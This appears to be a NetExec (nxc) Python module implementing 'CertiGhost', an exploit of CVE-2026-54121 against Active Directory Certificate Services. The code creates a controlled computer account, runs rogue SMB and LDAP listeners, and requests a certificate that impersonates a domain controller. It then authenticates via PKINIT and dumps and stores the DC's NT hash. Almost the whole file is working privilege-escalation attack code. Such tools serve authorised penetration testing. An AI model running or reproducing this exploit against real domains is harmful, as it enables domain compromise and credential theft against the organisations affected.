import secrets
import socket
import string
import threading
import time
from datetime import datetime
from pathlib import Path
from sys import exit

from impacket.ldap.ldapasn1 import Scope
from nxc.helpers import certighost as ghost
from nxc.helpers.misc import CATEGORY
from nxc.paths import NXC_PATH


class NXCModule:
    """CertiGhost chain adapted from the PoC by @h0j3n and @aniqfakhrul."""

    name = "certighost"
    description = "Request a DC certificate through CVE-2026-54121 and authenticate with PKINIT"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    opsec_safe = False
    multiple_hosts = False

    def options(self, context, module_options):
        """
        CA             CA name (default: discover from AD)
        CA_IP          CA address (default: resolve discovered CA host)
        LISTENER       Local IP advertised to the CA (default: route to DC)
        TARGET         Computer sAMAccountName to impersonate (default: first DC)
        TEMPLATE       Certificate template (default: Machine)
        COMPUTER_NAME  Existing controlled computer account (omit to create one)
        COMPUTER_PASS  Password for COMPUTER_NAME
        COMPUTER_HASH  NT hash for COMPUTER_NAME
        OUTPUT         Output directory (default: NXC_PATH/modules/certighost)

        Requires the local SMB (445) and LDAP (389) ports and CA callbacks to LISTENER.
        Example: netexec ldap DC_IP -u USER -p PASSWORD -M certighost -o CA=CA_NAME CA_IP=CA_IP LISTENER=LOCAL_IP
        """
        self.ca = module_options.get("CA")
        self.ca_ip = module_options.get("CA_IP")
        self.listener = module_options.get("LISTENER")
        self.target = module_options.get("TARGET")
        self.template = module_options.get("TEMPLATE", "Machine")
        self.computer_name = module_options.get("COMPUTER_NAME")
        self.computer_pass = module_options.get("COMPUTER_PASS")
        self.computer_hash = module_options.get("COMPUTER_HASH")
        self.output = module_options.get("OUTPUT")
        if self.computer_pass and self.computer_hash:
            context.log.fail("COMPUTER_PASS and COMPUTER_HASH are mutually exclusive")
            exit(1)
        if self.computer_name and not (self.computer_pass or self.computer_hash):
            context.log.fail("COMPUTER_NAME requires COMPUTER_PASS or COMPUTER_HASH")
            exit(1)
        if (self.computer_pass or self.computer_hash) and not self.computer_name:
            context.log.fail("COMPUTER_PASS or COMPUTER_HASH requires COMPUTER_NAME")
            exit(1)

    def listeners_available(self, context):
        for port in (445, 389):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
                try:
                    listener.bind(("0.0.0.0", port))
                except OSError as e:
                    context.log.fail(f"Cannot bind local port {port}: {e}")
                    return False
        return True

    def escape_filter(self, value):
        for char, replacement in (("\\", "\\5c"), ("*", "\\2a"), ("(", "\\28"), (")", "\\29"), ("\x00", "\\00")):
            value = value.replace(char, replacement)
        return value

    def on_login(self, context, connection):
        dc_ip = connection.host
        domain = connection.domain
        base_dn = connection.baseDN
        ldap = connection.ldap_connection

        if not self.listeners_available(context):
            return
        listener = self.listener or ghost.detect_ip(dc_ip)
        if not listener:
            context.log.fail("Could not determine listener IP; set LISTENER")
            return

        ca_name = self.ca
        ca_ip = self.ca_ip
        if not ca_name:
            entry = ghost.ldap_query_one(ldap, f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{base_dn}", "(objectClass=pKIEnrollmentService)", ["cn", "dNSHostName"])
            if entry:
                ca_name = entry.get("cn")
                if not ca_ip and entry.get("dNSHostName"):
                    ca_ip = ghost.dns_resolve(entry["dNSHostName"], dc_ip)
        if not ca_name:
            context.log.fail("Could not discover CA name; set CA")
            return
        ca_ip = ca_ip or dc_ip

        target = self.target
        if not target:
            entry = ghost.ldap_query_one(ldap, base_dn, "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", ["sAMAccountName"])
            if not entry:
                context.log.fail("Could not discover a DC account; set TARGET")
                return
            target = entry["sAMAccountName"]
        if not target.endswith("$"):
            target += "$"
        entry = ghost.ldap_query_one(ldap, base_dn, f"(&(objectCategory=computer)(sAMAccountName={self.escape_filter(target)}))", ["dNSHostName", "objectSid", "sAMAccountName"])
        if not entry:
            context.log.fail(f"Target account {target} not found")
            return
        target = entry["sAMAccountName"]
        target_dns = entry.get("dNSHostName") or f"{target.rstrip('$')}.{domain}"
        target_sid = entry["objectSid"]
        root = ghost.ldap_query(ldap, base_dn, "(objectClass=*)", ["objectSid", "objectGUID"], Scope("baseObject"))
        domain_sid = ghost.bin2sid(root[0]["objectSid"]) if root else "-".join(ghost.bin2sid(target_sid).split("-")[:-1])
        domain_guid = root[0].get("objectGUID", b"\x00" * 16) if root else b"\x00" * 16

        if self.computer_name:
            computer = self.computer_name if self.computer_name.endswith("$") else f"{self.computer_name}$"
            password = self.computer_pass or ""
            nthash = self.computer_hash or ghost.compute_nthash(password)
            context.log.display(f"Using controlled computer {computer}")
        else:
            computer = "GHOST" + "".join(secrets.choice(string.ascii_uppercase) for _ in range(8)) + "$"
            password = "CG" + secrets.token_hex(10) + "Aa1"
            context.log.display(f"Creating controlled computer {computer}")
            try:
                ghost.create_computer(ldap, dc_ip, domain, connection.username, connection.password, connection.lmhash, connection.nthash, computer, password, base_dn, connection.kerberos, connection.aesKey, connection.hostname or "")
            except Exception as e:
                context.log.fail(f"Computer creation failed: {e}")
                return
            nthash = ghost.compute_nthash(password)
            context.db.add_credential("plaintext", domain, computer, password)

        output = Path(self.output) if self.output else Path(NXC_PATH) / "modules" / "certighost" / f"{domain}_{target.rstrip('$')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        output.mkdir(parents=True, exist_ok=True)
        context.log.display(f"CA: {ca_name} ({ca_ip}); target: {target}; listener: {listener}")
        try:
            ghost.patch_smb()
            threading.Thread(target=ghost.run_lsa, daemon=True, args=("0.0.0.0", 445, domain.split(".")[0].upper(), domain, domain, domain_guid, domain_sid, computer, nthash, password, domain, dc_ip)).start()
            rogue_ldap = ghost.RogueLDAP(domain, domain.split(".")[0].upper(), computer, nthash, domain, dc_ip, target_sid, target_dns, target.rstrip("$"), target)
            threading.Thread(target=rogue_ldap.serve, daemon=True, args=("0.0.0.0", 389)).start()
            for _ in range(15):
                time.sleep(1)
                if ghost.port_ok("127.0.0.1", 445) and ghost.port_ok("127.0.0.1", 389):
                    break
            else:
                context.log.fail("Rogue listeners did not start")
                return

            context.log.display(f"Requesting {self.template} certificate")
            pfx = ghost.request_cert(ca_ip, ca_name, domain, computer, nthash, dc_ip, listener, target_dns, self.template)
            pfx_path = output / f"{target.rstrip('$').lower()}.pfx"
            pfx_path.write_bytes(pfx)
            context.log.success(f"Saved certificate: {pfx_path}")
            nt_hash, lm_hash, cache_path = ghost.pkinit_and_hash(pfx, target.lower(), domain, dc_ip, output)
            context.log.success(f"Saved Kerberos cache: {cache_path}")
            if nt_hash:
                context.log.highlight(f"{target}:{lm_hash}:{nt_hash}")
                context.db.add_credential("hash", domain, target, nt_hash)
            else:
                context.log.fail("Certificate issued, but no NT hash was extracted")
        except Exception as e:
            context.log.fail(f"CertiGhost failed: {e}")
